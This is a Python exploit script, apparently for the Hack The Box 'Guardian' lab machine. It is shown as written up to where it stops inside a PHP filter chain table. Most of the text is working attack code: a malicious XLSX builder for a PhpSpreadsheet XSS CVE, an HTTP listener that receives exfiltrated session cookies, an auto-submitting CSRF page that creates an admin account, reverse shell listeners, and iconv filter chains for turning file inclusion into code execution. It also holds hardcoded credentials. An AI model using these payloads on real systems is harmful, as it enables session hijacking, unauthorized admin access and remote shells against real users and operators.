#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║          HTB GUARDIAN FULL CHAIN AUTOMATED EXPLOIT                        ║
║          Shadow Team | Authorized Penetration Testing Only                  ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Usage:  ./guardian.py <TARGET_IP> [LHOST]                                   ║
║  Alias:  ./guardian.sh <TARGET_IP> [LHOST] [--yes]                           ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  ATTACK CHAIN                                                                ║
║  ─────────────────────────────────────────────────────────────────────────  ║
║  [1] Recon        nmap → portal.guardian.htb + gitea.guardian.htb           ║
║  [2] Initial      Default creds GU0142023:GU1234 → student portal           ║
║  [3] IDOR         ffuf chat enum → jamil.enockson Gitea creds               ║
║  [4] Gitea        Source code → DB root creds + SHA256 salt                  ║
║  [5] XSS          CVE-2024-56409 malicious XLSX → lecturer cookie hijack    ║
║  [6] CSRF         Token reuse → admin account creation                       ║
║  [7] LFI→RCE      PHP filter chain + regex bypass → www-data shell          ║
║  [8] Lateral      MySQL hash dump + crack → su jamil → user.txt             ║
║  [9] PrivEsc1     status.py hijack (admins group write) → mark shell        ║
║  [10] PrivEsc2    safeapache2ctl LoadModule logic flaw → SUID bash → root   ║
║  [11] Flags       Auto-extract user.txt + root.txt                           ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import sys
import os
import re
import time
import socket
import struct
import threading
import hashlib
import zipfile
import subprocess
import base64
import json
import random
import string
from io import BytesIO
from urllib.parse import urlencode, quote, unquote, urlparse, parse_qs
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] Install: pip install requests")
    sys.exit(1)

try:
    import openpyxl
except ImportError:
    print("[!] Install: pip install openpyxl")
    sys.exit(1)


# ══════════════════════════════════════════════════════════════════════════════
#  TERMINAL COLORS & LOGGER
# ══════════════════════════════════════════════════════════════════════════════

class C:
    RED = '\033[91m'
    GRN = '\033[92m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    MGT = '\033[95m'
    CYN = '\033[96m'
    WHT = '\033[97m'
    DIM = '\033[2m'
    BOLD = '\033[1m'
    RST = '\033[0m'


def banner():
    b = f"""
{C.RED}{C.BOLD}
 ██████╗ ██╗   ██╗ █████╗ ██████╗ ██████╗ ██╗ █████╗ ███╗   ██╗
██╔════╝ ██║   ██║██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗████╗  ██║
██║  ███╗██║   ██║███████║██████╔╝██║  ██║██║███████║██╔██╗ ██║
██║   ██║██║   ██║██╔══██║██╔══██╗██║  ██║██║██╔══██║██║╚██╗██║
╚██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝██║██║  ██║██║ ╚████║
 ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
{C.RST}{C.CYN}
         HTB Guardian · Full-Chain Automated Exploit
         Shadow Team · Authorized Pen-Testing Only
{C.RST}"""
    print(b)


def log(phase, msg, level='info'):
    ts = time.strftime('%H:%M:%S')
    icons = {
        'info': f'{C.BLU}[*]{C.RST}',
        'ok': f'{C.GRN}[+]{C.RST}',
        'warn': f'{C.YLW}[!]{C.RST}',
        'err': f'{C.RED}[-]{C.RST}',
        'phase': f'{C.MGT}[►]{C.RST}',
        'flag': f'{C.GRN}{C.BOLD}[★]{C.RST}',
        'shell': f'{C.CYN}[»]{C.RST}',
    }
    icon = icons.get(level, icons['info'])
    phase_str = f'{C.DIM}[{phase}]{C.RST} ' if phase else ''
    print(f'{C.DIM}{ts}{C.RST} {icon} {phase_str}{msg}')


def phase_header(n, title):
    print(f"\n{C.MGT}{'═' * 70}{C.RST}")
    print(f"{C.MGT}{C.BOLD}  PHASE {n}: {title}{C.RST}")
    print(f"{C.MGT}{'═' * 70}{C.RST}")


# ══════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════════════════════════════════════════

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <TARGET_IP> [LHOST]")
    print(f"Example: {sys.argv[0]} 10.10.11.84 10.10.14.250")
    sys.exit(1)

TARGET_IP = sys.argv[1]
CLI_LHOST = sys.argv[2] if len(sys.argv) >= 3 else None

# Ports for reverse callbacks
PORT_XSS_LISTENER = 8888  # HTTP server to catch XSS cookie
PORT_CSRF_SERVER = 8080  # HTTP server to serve CSRF exploit.html
PORT_SHELL_WWW = 4444  # Reverse shell (www-data)
PORT_SHELL_MARK = 4445  # Reverse shell (mark)
ACTIVE_XSS_PORT = PORT_XSS_LISTENER
ACTIVE_CSRF_PORT = PORT_CSRF_SERVER
ACTIVE_XSS_PORTS = [PORT_XSS_LISTENER]
ACTIVE_CSRF_PORTS = [PORT_CSRF_SERVER]

# Known credentials (extracted from writeup / discovered during run)
STUDENT_USER = "GU0142023"
STUDENT_PASS = "GU1234"
GITEA_USER = "jamil.enockson@guardian.htb"
GITEA_PASS = "DHsNnk3V503"
DB_PASS = "Gu4rd14n_un1_1s_th3_b3st"
DB_SALT = "8Sb)tM1vs1SS"
ADMIN_USER = "pwned_admin"
ADMIN_PASS = "Shadow@2025!"
JAMIL_PASS = None  # discovered dynamically via hash crack
WORDLIST = "/usr/share/wordlists/rockyou.txt"


def env_int(name: str, default: int) -> int:
    raw = os.getenv(name, str(default)).strip()
    try:
        return int(raw)
    except ValueError:
        return default


def env_ports(name: str, defaults: list[int]) -> list[int]:
    raw = os.getenv(name, "").strip()
    if not raw:
        return defaults[:]
    ports = []
    for token in raw.split(','):
        token = token.strip()
        if not token:
            continue
        try:
            p = int(token)
        except ValueError:
            continue
        if 1 <= p <= 65535 and p not in ports:
            ports.append(p)
    return ports or defaults[:]


XSS_WAIT_SECONDS = env_int("GUARDIAN_XSS_WAIT", 300)
CSRF_LOGIN_ATTEMPTS = env_int("GUARDIAN_CSRF_ATTEMPTS", 5)
CSRF_RETRY_SLEEP = env_int("GUARDIAN_CSRF_RETRY_SLEEP", 10)
XSS_UPLOAD_MAX_HITS = env_int("GUARDIAN_XSS_UPLOAD_MAX", 8)
XSS_PORT_CANDIDATES = env_ports("GUARDIAN_XSS_PORTS", [80, 8888, 8088, 18080, PORT_XSS_LISTENER])
CSRF_PORT_CANDIDATES = env_ports("GUARDIAN_CSRF_PORTS", [80, 8080, 8000, 18080, PORT_CSRF_SERVER])
WWW_SHELL_PORT_CANDIDATES = env_ports("GUARDIAN_WWW_SHELL_PORTS", [PORT_SHELL_WWW, 443, 80, 8081])
MARK_SHELL_PORT_CANDIDATES = env_ports("GUARDIAN_MARK_SHELL_PORTS", [PORT_SHELL_MARK, 80, 8082, 443])
AUTO_FETCH_PHPFCG = os.getenv("GUARDIAN_AUTO_FETCH_PHPFCG", "1").strip() != "0"
PHPFCG_CLONE_DIR = os.getenv("GUARDIAN_PHPFCG_DIR", "/tmp/guardian_phpfcg")


# ══════════════════════════════════════════════════════════════════════════════
#  NETWORK HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def get_local_ip():
    """Auto-detect tun0 / VPN IP."""
    # Try tun0 first (HTB VPN interface)
    for iface in ['tun0', 'tap0', 'eth0', 'ens3', 'ens18']:
        try:
            result = subprocess.run(
                ['ip', 'addr', 'show', iface],
                capture_output=True, text=True, timeout=3
            )
            m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/', result.stdout)
            if m:
                return m.group(1)
        except Exception:
            pass
    # Routing-based fallback
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect((TARGET_IP, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "10.10.14.1"  # HTB default fallback


LHOST = CLI_LHOST if CLI_LHOST else get_local_ip()


def make_session(retries=3):
    """Create requests.Session with retry logic."""
    s = requests.Session()
    retry = Retry(total=retries, backoff_factor=0.5,
                  status_forcelist=[500, 502, 503])
    adapter = HTTPAdapter(max_retries=retry)
    s.mount('http://', adapter)
    s.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'})
    return s


# ══════════════════════════════════════════════════════════════════════════════
#  HOSTS FILE MANAGEMENT
# ══════════════════════════════════════════════════════════════════════════════

VHOSTS = ['guardian.htb', 'portal.guardian.htb', 'gitea.guardian.htb']


def update_hosts():
    """Add required vhosts to /etc/hosts (requires root or sudo)."""
    try:
        with open('/etc/hosts', 'r') as f:
            content = f.read()

        missing = [vh for vh in VHOSTS if vh not in content]
        if not missing:
            log('HOSTS', 'Virtual hosts already present in /etc/hosts', 'ok')
            return True

        entry = f"\n{TARGET_IP}  {' '.join(VHOSTS)}\n"
        with open('/etc/hosts', 'a') as f:
            f.write(entry)
        log('HOSTS', f'Added: {" ".join(VHOSTS)} → {TARGET_IP}', 'ok')
        return True
    except PermissionError:
        log('HOSTS', 'Cannot write /etc/hosts (no root). Run: '
                     f'echo "{TARGET_IP} guardian.htb portal.guardian.htb gitea.guardian.htb" | sudo tee -a /etc/hosts',
            'warn')
        return False


# ══════════════════════════════════════════════════════════════════════════════
#  REVERSE SHELL LISTENER
# ══════════════════════════════════════════════════════════════════════════════

class ShellSession:
    """
    Manages a reverse shell connection over a raw TCP socket.
    Provides send/recv/execute primitives with timeout handling.
    """

    def __init__(self, conn: socket.socket, addr, label='shell'):
        self.conn = conn
        self.addr = addr
        self.label = label
        self.conn.settimeout(15)
        self._lock = threading.Lock()

    def send(self, data: str | bytes):
        with self._lock:
            if isinstance(data, str):
                data = data.encode()
            self.conn.sendall(data)

    def recv_until(self, sentinel: str, timeout: float = 20.0) -> str:
        """Read until sentinel string appears in output."""
        buf = b""
        deadline = time.time() + timeout
        self.conn.settimeout(2.0)
        while time.time() < deadline:
            try:
                chunk = self.conn.recv(4096)
                if not chunk:
                    break
                buf += chunk
                if sentinel.encode() in buf:
                    break
            except socket.timeout:
                continue
        return buf.decode(errors='replace')

    def recv_all(self, timeout: float = 8.0) -> str:
        """Drain available output."""
        buf = b""
        self.conn.settimeout(2.0)
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = self.conn.recv(4096)
                if not chunk:
                    break
                buf += chunk
                # If we see a shell prompt, stop
                if re.search(rb'[$#]\s*$', buf.strip()):
                    # Give a tiny bit more time for stragglers
                    time.sleep(0.3)
                    try:
                        buf += self.conn.recv(4096)
                    except socket.timeout:
                        pass
                    break
            except socket.timeout:
                if buf:
                    break
        return buf.decode(errors='replace')

    def execute(self, cmd: str, timeout: float = 15.0, sentinel: str = None) -> str:
        """Send command, return output."""
        marker = f"DONE_{random.randint(10000, 99999)}"
        full_cmd = f"{cmd}; echo {marker}\n"
        self.send(full_cmd)
        output = self.recv_until(marker, timeout)
        # Strip the marker from output
        output = output.replace(marker, '').strip()
        if self.label:
            pass  # Could log here
        return output

    def close(self):
        try:
            self.conn.close()
        except Exception:
            pass


class ShellListener:
    """
    TCP socket server that waits for incoming reverse shell connections.
    Non-blocking call accept() to wait for the shell with a timeout.
    """

    def __init__(self, port: int, label: str = 'shell'):
        self.port = port
        self.label = label
        self._srv = None
        self._session = None
        self._event = threading.Event()
        self._thread = None

    def start(self):
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind(('0.0.0.0', self.port))
        self._srv.listen(1)
        self._srv.settimeout(120)
        log(self.label, f'Listening on 0.0.0.0:{self.port}', 'info')
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()

    def _accept_loop(self):
        try:
            conn, addr = self._srv.accept()
            self._session = ShellSession(conn, addr, self.label)
            log(self.label, f'Shell connected from {addr[0]}:{addr[1]}', 'ok')
            self._event.set()
        except socket.timeout:
            log(self.label, 'Listener timed out waiting for shell', 'err')
            self._event.set()

    def accept(self, timeout: float = 90.0) -> ShellSession | None:
        """Block until shell connects (or timeout). Returns ShellSession or None."""
        self._event.wait(timeout)
        return self._session

    def close(self):
        try:
            self._srv.close()
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
#  HTTP LISTENER capture XSS cookie exfil
# ══════════════════════════════════════════════════════════════════════════════

_captured_cookie: dict = {}


class XSSHandler(BaseHTTPRequestHandler):
    """Handles GET /?c=<base64_cookie> requests from the XSS payload."""

    def do_GET(self):
        global _captured_cookie
        try:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if parsed.path.endswith('/exploit.html') or parsed.path == '/exploit.html':
                token = params.get('token', [''])[0]
                html = build_admin_csrf_html(token) if token else "<html><body>OK</body></html>"
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(html.encode())
                log('XSS', f'exploit.html served (token={"yes" if token else "no"}) to {self.client_address[0]}', 'ok')
                return
            if 'c' in params and params['c']:
                b64 = params['c'][0]
                b64 = unquote(b64).replace(' ', '+')
                pad = '=' * ((4 - (len(b64) % 4)) % 4)
                decoded = base64.b64decode(b64 + pad).decode(errors='replace')
                _captured_cookie['raw'] = decoded
                _captured_cookie['path'] = self.path
                log('XSS', f'Cookie exfiltrated: {decoded}', 'ok')
        except Exception as e:
            log('XSS', f'Decode error: {e}', 'warn')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, fmt, *args):
        # Suppress default HTTP server log noise
        log('XSS-HTTP', f'{self.address_string()} - {fmt % args}', 'info')


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


_xss_servers: list[ThreadedHTTPServer] = []
_csrf_servers_inst: list[ThreadedHTTPServer] = []


def build_admin_csrf_html(csrf_token: str) -> str:
    return f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Loading...</title></head>
<body>
<form id="f" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
  <input type="hidden" name="username"   value="{ADMIN_USER}">
  <input type="hidden" name="password"   value="{ADMIN_PASS}">
  <input type="hidden" name="full_name"  value="Shadow Admin">
  <input type="hidden" name="email"      value="{ADMIN_USER}@guardian.htb">
  <input type="hidden" name="dob"        value="1990-01-01">
  <input type="hidden" name="address"    value="Shadow HQ">
  <input type="hidden" name="user_role"  value="admin">
  <input type="hidden" name="csrf_token" value="{csrf_token}">
</form>
<script>document.getElementById('f').submit();</script>
</body>
</html>"""


def start_xss_listener():
    global _xss_servers, ACTIVE_XSS_PORT, ACTIVE_XSS_PORTS
    stop_xss_listener()
    bound_ports = []
    seen = set()
    candidates = [p for p in XSS_PORT_CANDIDATES if not (p in seen or seen.add(p))]
    # Small fallback window only, avoid binding dozens of ports.
    candidates.extend(p for p in range(PORT_XSS_LISTENER, PORT_XSS_LISTENER + 4) if p not in seen)
    for port in candidates:
        try:
            srv = ThreadedHTTPServer(('0.0.0.0', port), XSSHandler)
            _xss_servers.append(srv)
            bound_ports.append(port)
            t = threading.Thread(target=srv.serve_forever, daemon=True)
            t.start()
        except OSError as e:
            if e.errno in (98, 48, 13):
                continue
            raise
    if not bound_ports:
        raise RuntimeError("No free port available for XSS listener")
    ACTIVE_XSS_PORTS = bound_ports
    ACTIVE_XSS_PORT = bound_ports[0]
    log('XSS', f'Cookie listener started on ports: {", ".join(str(p) for p in bound_ports)}', 'ok')
    return bound_ports


def wait_for_cookie(timeout: float = 90.0) -> str | None:
    """Poll _captured_cookie until populated or timeout."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        if _captured_cookie.get('raw'):
            return _captured_cookie['raw']
        time.sleep(1)
    return None


def stop_xss_listener():
    global _xss_servers
    for srv in _xss_servers:
        try:
            srv.shutdown()
            srv.server_close()
        except Exception:
            pass
    _xss_servers = []


# ══════════════════════════════════════════════════════════════════════════════
#  HTTP CSRF SERVER serve the exploit.html
# ══════════════════════════════════════════════════════════════════════════════

_csrf_html: str = ""


class CSRFHandler(BaseHTTPRequestHandler):
    """Serves exploit.html for CSRF admin creation."""

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(_csrf_html.encode())
        log('CSRF', f'exploit.html served to {self.client_address[0]}', 'ok')

    def log_message(self, fmt, *args):
        log('CSRF-HTTP', f'{self.address_string()} - {fmt % args}', 'info')


def start_csrf_server(csrf_html: str):
    global _csrf_html, _csrf_servers_inst, ACTIVE_CSRF_PORT, ACTIVE_CSRF_PORTS
    stop_csrf_server()
    _csrf_html = csrf_html
    bound_ports = []
    seen = set()
    candidates = [p for p in CSRF_PORT_CANDIDATES if not (p in seen or seen.add(p))]
    # Small fallback window only, avoid binding dozens of ports.
    candidates.extend(p for p in range(PORT_CSRF_SERVER, PORT_CSRF_SERVER + 4) if p not in seen)
    for port in candidates:
        try:
            srv = ThreadedHTTPServer(('0.0.0.0', port), CSRFHandler)
            _csrf_servers_inst.append(srv)
            bound_ports.append(port)
            t = threading.Thread(target=srv.serve_forever, daemon=True)
            t.start()
        except OSError as e:
            if e.errno in (98, 48, 13):
                continue
            raise
    if not bound_ports:
        raise RuntimeError("No free port available for CSRF server")
    ACTIVE_CSRF_PORTS = bound_ports
    ACTIVE_CSRF_PORT = bound_ports[0]
    log('CSRF', f'CSRF server started on ports: {", ".join(str(p) for p in bound_ports)}', 'ok')
    return bound_ports


def stop_csrf_server():
    global _csrf_servers_inst
    for srv in _csrf_servers_inst:
        try:
            srv.shutdown()
            srv.server_close()
        except Exception:
            pass
    _csrf_servers_inst = []


# ══════════════════════════════════════════════════════════════════════════════
#  MALICIOUS XLSX GENERATOR (CVE-2024-56409)
# ══════════════════════════════════════════════════════════════════════════════

def build_malicious_xlsx(xss_payload: str) -> bytes:
    """
    Build an XLSX file with XSS payload in a worksheet name.
    PhpSpreadsheet ≤ 3.7.0 renders sheet names unescaped in HTML
    (CVE-2024-56409 / CVE-2024-56366).

    Technique:
    - XLSX = ZIP containing XML
    - 2+ sheets required to trigger generateNavigation()
    - Sheet 2 name = XSS payload (XML-encoded in the archive)
    - PhpSpreadsheet reads name as raw string, writes to HTML without htmlspecialchars()
    """

    # XML-encode the payload for the attribute value
    # (the XSS fires when PhpSpreadsheet un-escapes it into HTML)
    def xml_escape(s):
        return (s.replace('&', '&amp;')
                .replace('"', '&quot;')
                .replace("'", '&apos;')
                .replace('<', '&lt;')
                .replace('>', '&gt;'))

    xss_encoded = xml_escape(xss_payload)

    content_types = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml"
    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml"
    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
  <Override PartName="/xl/worksheets/sheet2.xml"
    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>"""

    rels = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="xl/workbook.xml"/>
</Relationships>"""

    workbook = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <fileVersion appName="xl" lastEdited="6" lowestEdited="6"/>
  <workbookView xWindow="0" yWindow="0" windowWidth="14805" windowHeight="8010"/>
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
    <sheet name="{xss_encoded}" sheetId="2" r:id="rId2"/>
  </sheets>
</workbook>"""

    wb_rels = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet"
    Target="worksheets/sheet1.xml"/>
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet"
    Target="worksheets/sheet2.xml"/>
</Relationships>"""

    sheet_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1">
      <c r="A1" t="inlineStr"><is><t>Data</t></is></c>
    </row>
  </sheetData>
</worksheet>"""

    buf = BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml', content_types)
        zf.writestr('_rels/.rels', rels)
        zf.writestr('xl/workbook.xml', workbook)
        zf.writestr('xl/_rels/workbook.xml.rels', wb_rels)
        zf.writestr('xl/worksheets/sheet1.xml', sheet_xml)
        zf.writestr('xl/worksheets/sheet2.xml', sheet_xml)

    buf.seek(0)
    return buf.read()


# ══════════════════════════════════════════════════════════════════════════════
#  PHP FILTER CHAIN GENERATOR
#  (inline port of synacktiv/php_filter_chain_generator)
# ══════════════════════════════════════════════════════════════════════════════

# Character map: each base64 character → iconv filter chain that prepends it
_FILTER_DICT = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32BE.UCS-4|convert.iconv.874.UTF-32BE',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    '4': 'convert.iconv.CP866.UNICODE|convert.iconv.CSUNICODE.CN|convert.iconv.UCS2.UTF-8|convert.iconv.TIS620.UCS-2LE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.TSCII|convert.iconv.ISO-IR-14.CSIBM921|convert.iconv.IBM921.UTF8',
    '8': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    '9': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'B': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022INTL',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5-HKSCS.UTF16|convert.iconv.ISO-IR-111.CSIBM880',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32BE',
    'I': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022INTL',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'K': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-14.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'M': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'N': 'convert.iconv.CP1259.UTF-32|convert.iconv.Unicode-l.IBM932',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'P': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'Q': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'S': 'convert.iconv.TS9816.UTF-32|convert.iconv.CS1.UTF-32BE',
    'T': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.851.UTF-16BE',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'W': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'Y': 'convert.iconv.CP1251.UTF-16|convert.iconv.L7.JOHAB',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'a': 'convert.iconv.CP1252.UTF16|convert.iconv.ISO6937.8859_4',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'c': 'convert.iconv.CSISO111ECMACyrillic.UTF-32|convert.iconv.ISO8859-9E.UCS4',
    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-14.UCS2',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.iconv.CP-861.UTF-8',
    'g': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32BE',
    'i': 'convert.iconv.ISO2022CN.UTF-32|convert.iconv.UTF32BE.MS936|convert.iconv.BIG5.JIS|convert.iconv.BIGFIVE.EUC-JISX0213',
    'j': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.CSPCP852.UTF-32BE|convert.iconv.IBM952.UTF-8',
    'l': 'convert.iconv.CSIBM866.UNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP1026.NAPLPS',
    'm': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UT8.SJIS|convert.iconv.ISO2022KR.UTF8',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS4LE.UTF32BE|convert.iconv.CSIBM921.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.iconv.SIRCAM.SHIFT_JISX0213',
    'r': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    's': 'convert.iconv.UTF8.CSISO2022KR',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM864.ISO6937',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CSISOLATINCYRILLIC.JOHAB',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'x': 'convert.iconv.ISO8859-14.UTF32|convert.iconv.MS932.MS936|convert.iconv.UTF16.CSISO10646',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.TSCII|convert.iconv.ISO-IR-14.CSIBM921|convert.iconv.IBM921.UTF8',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
